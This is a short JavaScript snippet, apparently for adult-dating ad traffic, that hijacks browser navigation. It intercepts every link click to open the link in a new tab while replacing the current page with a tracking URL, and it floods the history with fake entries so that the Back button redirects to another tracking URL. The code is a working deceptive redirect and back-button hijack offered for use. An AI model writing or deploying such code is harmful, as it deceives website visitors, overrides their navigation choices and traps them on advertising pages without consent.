// Backunder Luck [CLOBAL] SL/ADULT-DATING
var back = 'https://a.averantix.com/visit/821f7be2-02b0-4210-8cc9-1e01b769eaef?track=BackButton&subsource={traffic_source_id}';
var under = 'https://a.averantix.com/visit/0b968054-fb69-4c9e-9de4-32de5782273a?track=Under&subsource={traffic_source_id}';

if (typeof under !== "undefined" && under !== null) {
    document.addEventListener('click', function(event) {
        const target = event.target.closest('a'); // Современный подход
        if (target) {
            const linkHref = target.href;
            event.preventDefault();
            window.open(linkHref, '_blank'); // Открытие в новой вкладке
            window.location.replace(under);  // Замена текущей страницы
        }
    });
}

if (typeof back !== "undefined" && back !== null) {
    (function() {
        try {
            const URL = window.location.href.split(/[#]/)[0];
            for (let t = 0; t < 10; t++) history.pushState({}, '', URL + '#');
            window.onpopstate = function(event) {
                if (event.state) location.replace(back);
            };
        } catch (error) {
            console.error(error);
        }
    })();
}

